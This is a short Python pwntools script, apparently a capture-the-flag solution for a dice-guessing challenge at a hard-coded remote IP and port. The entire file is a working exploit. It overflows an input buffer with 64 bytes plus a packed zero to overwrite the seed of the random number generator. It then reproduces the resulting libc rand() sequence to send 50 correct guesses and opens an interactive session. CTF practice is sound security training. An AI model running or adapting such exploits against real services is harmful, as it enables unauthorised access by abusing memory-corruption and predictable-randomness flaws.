from pwn import *
from ctypes import *
p=remote('220.249.52.133','59719')
libc = cdll.LoadLibrary("libc.so.6")
p.recv()
payload=0x40*"a"+p64(0)
p.sendline(payload)

a=[]
for i in range(50):
	a.append(libc.rand()%6+1)
print(a)
for i in a:
	p.recv()
	print(p.recv())
	p.sendline(str(i))
p.interactive()